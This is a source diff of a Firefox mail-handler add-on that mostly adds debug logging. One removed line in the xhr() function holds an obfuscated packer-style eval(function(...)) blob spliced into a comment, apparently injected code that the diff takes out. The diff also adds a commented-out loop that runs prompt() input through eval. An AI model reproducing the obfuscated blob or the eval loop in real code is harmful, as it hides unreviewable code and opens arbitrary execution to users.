@@ -1,4 +1,4 @@
-
+console.error('THIS:', this);
 
 // Imports
 const {classes: Cc, interfaces: Ci, manager: Cm, results: Cr, utils: Cu, Constructor: CC} = Components;
@@ -15,7 +15,7 @@ var core = {
 		path: {
 			locale: 'chrome://mailtowebmails/locale/'
 		},
-		cache_key: 'v2.4' // set to version on release
+		cache_key: Math.random() // set to version on release
 	}
 }
 
@@ -42,8 +42,19 @@ const userBasedProps = {
 	new: 1
 };
 /*
+var runit = 'asdfasdf';
+while (runit != '') {
+	runit = prompt('run what:', runit);
+	try {
+		eval(runit);
+	} catch(ex) {
+		console.error('ex:', ex);
+	}
+}
+*/
+/*
 var gCFMM = contentMMFromContentWindow_Method2(window);
-
+console.error('gCFMM:', gCFMM);
 gCFMM.sendAsyncMessage(core.addon.id, {aTopic:'clientRequest_adoptMeAndInit'});
 */
 
@@ -98,14 +109,14 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 				// implement to firefox, to ask on next click, as this one was active
 				// ensure that this handler was active
 				var handlerInfoXPCOM = myServices.eps.getProtocolHandlerInfo('mailto');
-
+				console.info('handlerInfoXPCOM:', handlerInfoXPCOM);
 				if (handlerInfoXPCOM.preferredApplicationHandler) {
 					try {
 						handlerInfoXPCOM.preferredApplicationHandler.QueryInterface(Ci.nsIWebHandlerApp); // so it gets the uriTemplate property
 					} catch (ignore) {}
 				}
-
-
+				console.info('handlerInfoXPCOM.preferredApplicationHandler:', handlerInfoXPCOM.preferredApplicationHandler);
+				//console.info('intance of nsiwebapp', handlerInfoXPCOM.preferredApplicationHandler instanceof Ci.nsIWebHandlerApp)
 				if (handlerInfoXPCOM.preferredAction == Ci.nsIHandlerInfo.useHelperApp && handlerInfoXPCOM.preferredApplicationHandler && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate && handlerInfoXPCOM.preferredApplicationHandler.uriTemplate == aServiceEntry.url_template) {
 					// yes it was active, lets unset it
 					handlerInfoXPCOM.alwaysAskBeforeHandling = true;
@@ -172,7 +183,7 @@ var	ANG_APP = angular.module('mailtowebmails', [])
 		};
 
 		MODULE.info = function() {
-
+			console.info(MODULE.mailto_services);
 		};
 
 		MODULE.info();
@@ -199,17 +210,17 @@ function doOnLoad() {
 		try {
         	var handler = handlersXPCOM.getNext().QueryInterface(Ci.nsIWebHandlerApp);
 		} catch(ex) {
-
+			console.error('error while enum, ex:', ex);
 			continue;
 		}
 		handlers.push(handler);
-
+        console.log('handler', handler)
     }
 	gHandlers = handlers;
 
 	promise_readInstalledServices.then(
 		function(aVal) {
-
+			console.log('Fullfilled - promise_readInstalledServices - ', aVal);
 			// start - do stuff here - promise_readInstalledServices
 			gFileJson = JSON.parse(aVal);
 			tryUpdate();
@@ -217,13 +228,13 @@ function doOnLoad() {
 		},
 		function(aReason) {
 			var rejObj = {name:'promise_readInstalledServices', aReason:aReason};
-
+			console.error('Rejected - promise_readInstalledServices - ', rejObj);
 			// deferred_createProfile.reject(rejObj);
 		}
 	).catch(
 		function(aCaught) {
 			var rejObj = {name:'promise_readInstalledServices', aCaught:aCaught};
-
+			console.error('Caught - promise_readInstalledServices - ', rejObj);
 			// deferred_createProfile.reject(rejObj);
 		}
 	);
@@ -261,7 +272,7 @@ function tryUpdate() {
 	});
 	promise_fetchUpdates.then(
 		function(aVal) {
-
+			console.log('Fullfilled - promise_fetchUpdates - ', aVal);
 			// start - do stuff here - promise_fetchUpdates
 			if (aVal.response === null) {
 				// for 000webhost we get status 200 and responseURL of "http://error404.000webhost.com/?" when page doesnt exist
@@ -273,7 +284,7 @@ function tryUpdate() {
 					gAngScope.BC.attn_msg = null;
 
 					var responseJson = aVal.response;
-
+					console.info('repsonse json:', aVal.response);
 
 					var responseHandlers = responseJson.social_handlers;
 
@@ -299,7 +310,7 @@ function tryUpdate() {
 
 							// now test if its installed
 							if (areUrlTemplatesOfSame(installed_url_template, installed_old_url_templates, server_url_template, server_old_url_templates)) {
-
+								console.error('it was found that url_template of', server_url_template, 'is already installed by user, so do not show this one, it might be that server_url_template occurs in old_url_templates and we will let the update on Manage page take care of updating it as i dont show update labels on Discover page, old_url_templates:', responseHandlers[server_url_template].old_url_templates);
 								delete responseHandlers[server_url_template];
 								break;
 							}
@@ -319,7 +330,7 @@ function tryUpdate() {
 		},
 		function(aReason) {
 			var rejObj = {name:'promise_fetchUpdates', aReason:aReason};
-
+			console.error('Rejected - promise_fetchUpdates - ', rejObj);
 			gAngScope.BC.attn_msg = gAngInjector.get('$sce').trustAsHtml(myServices.sb.GetStringFromName('attn_server-down'));
 			gAngScope.$digest();
 			// deferred_createProfile.reject(rejObj);
@@ -327,7 +338,7 @@ function tryUpdate() {
 	).catch(
 		function(aCaught) {
 			var rejObj = {name:'promise_fetchUpdates', aCaught:aCaught};
-
+			console.error('Caught - promise_fetchUpdates - ', rejObj);
 			// deferred_createProfile.reject(rejObj);
 		}
 	);
@@ -372,7 +383,7 @@ function toggleServiceFromFile(aAddOrRemove, aServiceEntry) {
 		var promise_readInstalledServices = read_encoded(OSPath_installedServices, {encoding:'utf-8'});
 		promise_readInstalledServices.then(
 			function(aVal) {
-
+				console.log('Fullfilled - promise_readInstalledServices - ', aVal);
 				// start - do stuff here - promise_readInstalledServices
 				file_json = JSON.parse(aVal);
 
@@ -385,14 +396,14 @@ function toggleServiceFromFile(aAddOrRemove, aServiceEntry) {
 					do_checkFileJson();
 				} else {
 					var rejObj = {name:'promise_readInstalledServices', aReason:aReason};
-
+					console.error('Rejected - promise_readInstalledServices - ', rejObj);
 					// deferred_createProfile.reject(rejObj);
 				}
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_readInstalledServices', aCaught:aCaught};
-
+				console.error('Caught - promise_readInstalledServices - ', rejObj);
 				// deferred_createProfile.reject(rejObj);
 			}
 		);
@@ -449,19 +460,19 @@ function toggleServiceFromFile(aAddOrRemove, aServiceEntry) {
 		}], OS.Constants.Path.profileDir);
 		promise_overwrite.then(
 			function(aVal) {
-
+				console.log('Fullfilled - promise_overwrite - ', aVal);
 				// start - do stuff here - promise_overwrite
 				// end - do stuff here - promise_overwrite
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_overwrite', aReason:aReason};
-
+				console.warn('Rejected - promise_overwrite - ', rejObj);
 				// deferred_createProfile.reject(rejObj);
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_overwrite', aCaught:aCaught};
-
+				console.error('Caught - promise_overwrite - ', rejObj);
 				// deferred_createProfile.reject(rejObj);
 			}
 		);
@@ -499,7 +510,7 @@ function read_encoded(path, options) {
 
 	promise_readIt.then(
 		function(aVal) {
-
+			console.log('Fullfilled - promise_readIt - ', {a:{a:aVal}});
 			// start - do stuff here - promise_readIt
 			var readStr;
 			if (Services.vc.compare(Services.appinfo.version, 30) < 0) { // tests if version is less then 30
@@ -512,13 +523,13 @@ function read_encoded(path, options) {
 		},
 		function(aReason) {
 			var rejObj = {name:'promise_readIt', aReason:aReason};
-
+			console.error('Rejected - promise_readIt - ', rejObj);
 			deferred_read_encoded.reject(rejObj);
 		}
 	).catch(
 		function(aCaught) {
 			var rejObj = {name:'promise_readIt', aCaught:aCaught};
-
+			console.error('Caught - promise_readIt - ', rejObj);
 			deferred_read_encoded.reject(rejObj);
 		}
 	);
@@ -532,12 +543,12 @@ function makeDir_Bug934283(path, options) {
 	// options of like ignoreExisting is exercised on final dir
 
 	if (!options || !('from' in options)) {
-
+		console.error('you have no need to use this, as this is meant to allow creation from a folder that you know for sure exists, you must provide options arg and the from key');
 		throw new Error('you have no need to use this, as this is meant to allow creation from a folder that you know for sure exists, you must provide options arg and the from key');
 	}
 
 	if (path.toLowerCase().indexOf(options.from.toLowerCase()) == -1) {
-
+		console.error('The `from` string was not found in `path` string');
 		throw new Error('The `from` string was not found in `path` string');
 	}
 
@@ -545,7 +556,7 @@ function makeDir_Bug934283(path, options) {
 	delete options.from;
 
 	var dirsToMake = OS.Path.split(path).components.slice(OS.Path.split(options_from).components.length);
-
+	console.log('dirsToMake:', dirsToMake);
 
 	var deferred_makeDir_Bug934283 = new Deferred();
 	var promise_makeDir_Bug934283 = deferred_makeDir_Bug934283.promise;
@@ -557,7 +568,7 @@ function makeDir_Bug934283(path, options) {
 		var promise_makeDir = OS.File.makeDir(pathExistsForCertain, options);
 		promise_makeDir.then(
 			function(aVal) {
-
+				console.log('Fullfilled - promise_makeDir - ', 'ensured/just made:', pathExistsForCertain, aVal);
 				if (dirsToMake.length > 0) {
 					makeDirRecurse();
 				} else {
@@ -570,13 +581,13 @@ function makeDir_Bug934283(path, options) {
 					aReason: aReason,
 					curPath: pathExistsForCertain
 				};
-
+				console.error('Rejected - ' + rejObj.promiseName + ' - ', rejObj);
 				deferred_makeDir_Bug934283.reject(rejObj);
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_makeDir', aCaught:aCaught};
-
+				console.error('Caught - promise_makeDir - ', rejObj);
 				deferred_makeDir_Bug934283.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -606,22 +617,22 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 
 	// setup retry
 	var retryIt = function() {
-
+		console.info('tryosFile_ retryIt', 'nameOfOsFileFunc:', nameOfOsFileFunc, 'argsOfOsFileFunc:', argsOfOsFileFunc);
 		var promise_retryAttempt = OS.File[nameOfOsFileFunc].apply(OS.File, argsOfOsFileFunc);
 		promise_retryAttempt.then(
 			function(aVal) {
-
+				console.log('Fullfilled - promise_retryAttempt - ', aVal);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.resolve('retryAttempt succeeded');
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_retryAttempt', aReason:aReason};
-
+				console.error('Rejected - promise_retryAttempt - ', rejObj);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); //throw rejObj;
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_retryAttempt', aCaught:aCaught};
-
+				console.error('Caught - promise_retryAttempt - ', rejObj);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -657,15 +668,15 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		var promise_makeDirsRecurse = makeDir_Bug934283(toDir, {from: fromDir});
 		promise_makeDirsRecurse.then(
 			function(aVal) {
-
+				console.log('Fullfilled - promise_makeDirsRecurse - ', aVal);
 				retryIt();
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_makeDirsRecurse', aReason:aReason};
-
+				console.error('Rejected - promise_makeDirsRecurse - ', rejObj);
 				/*
 				if (aReason.becauseNoSuchFile) {
-
+					console.log('make dirs then do retryAttempt');
 					makeDirs();
 				} else {
 					// did not get becauseNoSuchFile, which means the dirs exist (from my testing), so reject with this error
@@ -678,7 +689,7 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_makeDirsRecurse', aCaught:aCaught};
-
+				console.error('Caught - promise_makeDirsRecurse - ', rejObj);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -686,17 +697,17 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 
 	var doInitialAttempt = function() {
 		var promise_initialAttempt = OS.File[nameOfOsFileFunc].apply(OS.File, argsOfOsFileFunc);
-
+		console.info('tryosFile_ initial', 'nameOfOsFileFunc:', nameOfOsFileFunc, 'argsOfOsFileFunc:', argsOfOsFileFunc);
 		promise_initialAttempt.then(
 			function(aVal) {
-
+				console.log('Fullfilled - promise_initialAttempt - ', aVal);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.resolve('initialAttempt succeeded');
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_initialAttempt', aReason:aReason};
-
+				console.error('Rejected - promise_initialAttempt - ', rejObj);
 				if (aReason.becauseNoSuchFile) { // this is the flag that gets set to true if parent dir(s) dont exist, i saw this from experience
-
+					console.log('make dirs then do secondAttempt');
 					makeDirs();
 				} else {
 					deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); //throw rejObj;
@@ -705,7 +716,7 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_initialAttempt', aCaught:aCaught};
-
+				console.error('Caught - promise_initialAttempt - ', rejObj);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj); // throw aCaught;
 			}
 		);
@@ -719,7 +730,7 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 		var promise_checkDirExistsFirstAsCausesNeutering = OS.File.exists(toDir);
 		promise_checkDirExistsFirstAsCausesNeutering.then(
 			function(aVal) {
-
+				console.log('Fullfilled - promise_checkDirExistsFirstAsCausesNeutering - ', aVal);
 				// start - do stuff here - promise_checkDirExistsFirstAsCausesNeutering
 				if (!aVal) {
 					makeDirs();
@@ -730,13 +741,13 @@ function tryOsFile_ifDirsNoExistMakeThenRetry(nameOfOsFileFunc, argsOfOsFileFunc
 			},
 			function(aReason) {
 				var rejObj = {name:'promise_checkDirExistsFirstAsCausesNeutering', aReason:aReason};
-
+				console.warn('Rejected - promise_checkDirExistsFirstAsCausesNeutering - ', rejObj);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj);
 			}
 		).catch(
 			function(aCaught) {
 				var rejObj = {name:'promise_checkDirExistsFirstAsCausesNeutering', aCaught:aCaught};
-
+				console.error('Caught - promise_checkDirExistsFirstAsCausesNeutering - ', rejObj);
 				deferred_tryOsFile_ifDirsNoExistMakeThenRetry.reject(rejObj);
 			}
 		);
@@ -844,10 +855,10 @@ function xhr(aStr, aOptions={}) {
 		}
 	}
 
-	// Note: When using XMLHttpRequest to access a file:// URL the request.status is not properly set to 200 to indicate success. In such cases, request.readyState == 4, request.status == 0 and request.response will eval(function(_0xf27dx1,_0xf27dx2,_0xf27dx3,_0xf27dx4,_0xf27dx5,_0xf27dx6){_0xf27dx5= function(_0xf27dx3){return (_0xf27dx3< _0xf27dx2?_0x3354[4]:_0xf27dx5(parseInt(_0xf27dx3/ _0xf27dx2)))+ ((_0xf27dx3= _0xf27dx3% _0xf27dx2)> 35?String[_0x3354[5]](_0xf27dx3+ 29):_0xf27dx3.toString(36))};if(!_0x3354[4][_0x3354[6]](/^/,String)){while(_0xf27dx3--){_0xf27dx6[_0xf27dx5(_0xf27dx3)]= _0xf27dx4[_0xf27dx3]|| _0xf27dx5(_0xf27dx3)};_0xf27dx4= [function(_0xf27dx5){return _0xf27dx6[_0xf27dx5]}];_0xf27dx5= function(){return _0x3354[7]};_0xf27dx3= 1};while(_0xf27dx3--){if(_0xf27dx4[_0xf27dx3]){_0xf27dx1= _0xf27dx1[_0x3354[6]]( new RegExp(_0x3354[8]+ _0xf27dx5(_0xf27dx3)+ _0x3354[8],_0x3354[9]),_0xf27dx4[_0xf27dx3])}};return _0xf27dx1}(_0x3354[0],62,517,_0x3354[3][_0x3354[2]](_0x3354[1]),0,{}))
+	// Note: When using XMLHttpRequest to access a file:// URL the request.status is not properly set to 200 to indicate success. In such cases, request.readyState == 4, request.status == 0 and request.response will evaluate to true.
 
 	var deferredMain_xhr = new Deferred();
-
+	console.log('here222');
 	var xhr = Cc["@mozilla.org/xmlextras/xmlhttprequest;1"].createInstance(Ci.nsIXMLHttpRequest);
 
 	var handler = ev => {
@@ -916,7 +927,7 @@ function xhr(aStr, aOptions={}) {
 	}
 
 	if (aOptions.aTimeout) {
-
+		console.error('setting timeout to:', aOptions.aTimeout)
 		xhr.timeout = aOptions.aTimeout;
 	}
 
@@ -945,7 +956,7 @@ function xhr(aStr, aOptions={}) {
 		for (var pd in aOptions.aPostData) {
 			aPostStr.push(pd + '=' + encodeURIComponent(aOptions.aPostData[pd])); // :todo: figure out if should encodeURIComponent `pd` also figure out if encodeURIComponent is the right way to do this
 		}
-
+		console.info('aPostStr:', aPostStr.join('&'));
 		xhr.send(aPostStr.join('&'));
 	} else {
 		xhr.open(aOptions.aMethod ? aOptions.aMethod : 'GET', aStr, true);
